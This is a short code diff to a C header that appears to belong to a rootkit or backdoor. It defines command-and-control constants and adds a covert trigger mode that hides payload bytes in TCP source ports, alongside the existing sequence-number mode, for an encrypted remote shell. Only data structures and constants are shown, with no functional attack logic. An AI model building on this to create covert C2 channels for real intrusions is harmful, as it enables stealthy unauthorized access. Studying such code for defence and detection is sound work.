@@ -26,11 +26,16 @@
 #define CC_PROT_COMMAND_HOOK_DEACTIVATE_ALL 2
 
 //C&C V3 -- Distributed hidden payload in packet stream + encrypted shell
-struct trigger_t {
+struct trigger_32_t {
     unsigned int seq_raw;
 };
-#define CC_STREAM_TRIGGER_PAYLOAD_LEN 12
-#define CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES 4
+struct trigger_16_t {
+    unsigned short src_port;
+};
+#define CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SEQ_NUM 12
+#define CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SEQ_NUM 4
+#define CC_STREAM_TRIGGER_PAYLOAD_LEN_MODE_SRC_PORT 12
+#define CC_STREAM_TRIGGER_PACKET_CAPACITY_BYTES_MODE_SRC_PORT 2
 #define CC_STREAM_TRIGGER_KEY_ENCRYPTED_SHELL CC_TRIGGER_SYN_PACKET_KEY_3_ENCRYPTED_SHELL
 
 
